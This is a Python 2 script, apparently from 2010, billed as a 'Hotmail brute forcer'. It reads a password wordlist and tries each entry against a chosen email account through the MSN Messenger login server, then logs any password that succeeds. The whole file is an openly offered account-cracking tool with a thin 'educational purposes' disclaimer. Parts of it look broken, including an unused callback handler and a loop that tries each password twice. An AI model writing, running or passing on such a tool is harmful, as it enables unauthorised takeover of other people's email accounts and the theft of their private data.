#!/usr/bin/python
# -*- coding: utf-8 -*-
# Hotmail brute forcer
# programmer : gunslinger_
# Inspired by mywisdom
# This program is only for educational purposes only.

import sys, time, msnp

__Author__ = "Gunslinger_"
__Version__  = "1.0"
__Date__   = "Mon, 22 Feb 2010 13:13:43 +0700 "
log = "hotmailbrute.log"
file = open(log, "a")
counter = 0
face = '''
 _           _                   _ _   _      __
| |__   ___ | |_ _ __ ___   __ _(_) | | |__  / _|
| '_ \ / _ \| __| '_ ` _ \ / _` | | | | '_ \| |_
| | | | (_) | |_| | | | | | (_| | | | | |_) |  _|
|_| |_|\___/ \__|_| |_| |_|\__,_|_|_| |_.__/|_|

 Hotmail brute forcer
 programmer   : %s
 version      : %s
 date release : %s
 ''' % (__Author__, __Version__, __Date__)

help = '''
Usage : ./hotmailbf.py -u [email] -w [wordlist]
Example : ./hotmailbf.py -u suckthedick@hotmail.com -w wordlist.txt
'''

for arg in sys.argv:
  if arg.lower() == '-u' or arg.lower() == '--user':
    email = sys.argv[int(sys.argv.index(arg))+1]
  elif arg.lower() == '-w' or arg.lower() == '--wordlist':
    wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
  elif arg.lower() == '-h' or arg.lower() == '--help':
    print face
    print help
    file.write(face)
    file.write(help)

try:
  preventstrokes = open(wordlist, "r")
  words = preventstrokes.readlines()
  count = 0
  while count < len(words):
    words[count] = words[count].strip()
    count += 1
except(IOError):
  print "\n[-] Error: Check your wordlist path\n"
  file.write("\n[-] Error: Check your wordlist path\n")
  sys.exit(1)

def definer():
  print "-" * 60
  print "[+] Email         : %s" % email
  print "[+] Wordlist         : %s" % wordlist
  print "[+] Length wordlist     : %s " % len(words)
  print "[+] Time Starting     : %s" % time.strftime("%X")
  print "-" * 60
  file.write ("\n[+] Email : %s" % email)
  file.write ("\n[+] Wordlist : %s" % wordlist)
  file.write ("\n[+] length wordlist : %s " % len(words))
  file.write ("\n[+] Time Starting : %s" % time.strftime("%X"))

class msnnologin(Exception):
  def __init__(self, output):
    self.output = output
  def __str__(self):
    return repr(self.output)
  
def msnparse():
  def state_changed(self, state):
    if state == "New state: NLN":
      return 0
    else:
      raise msnnologin(state)
  
def main(password):
  global counter
  sys.stdout.write ("[-] Trying : %s \n" % (password))
  sys.stdout.flush()
  file.write("[-] Trying : %s \n" % (str(password)))
  try:
    dispatch_server = ('messenger.hotmail.com', 1863)
    msntmp = msnp.Session(msnparse())
    msntmp.login(email, password)
    print "[+] W00t w00t !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Valid!" % (email, password)
    file.write("[+] W00t w00t !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Valid!" % (email, password))
    sys.exit(1)
  except msnp.error.HttpError:
    exit
  except msnnologin:
      exit
  except KeyboardInterrupt:
    print "\n[-] Aborting...\n"
    file.write("\n[-] Aborting...\n")
    sys.exit(1)
  counter+=1
  if counter == len(words)/5:
    print "[+] Hotmailbruteforcer 20% way done..."
    print "[+] Please be patient..."
    file.write("[+] hotmailbruteforcer on 1/4 way done...\n")
    file.write("[+] Please be patient...\n")
  elif counter == len(words)/4:
    print "[+] Hotmailbruteforcer 25% way done..."
    print "[+] Please be patient..."
    file.write("[+] hotmailbruteforcer on 1/4 way done...\n")
    file.write("[+] Please be patient...\n")
  elif counter == len(words)/2:
    print "[+] Hotmailbruteforcer on 50% done..."
    print "[+] Please be patient..."
    file.write("[+] hotmailbruteforcer on halfway done...\n")
    file.write("[+] Please be patient...\n")
  elif counter == len(words):
    print "[+] Hotmailbruteforcer done...\n"
    file.write("[+] Hotmailbruteforcer done...!\n")
  msntmp.logout()

if __name__ == '__main__':
  print face
  file.write(face)
  definer()
  for password in words:
    main(password.replace("\n",""))
    main(password)
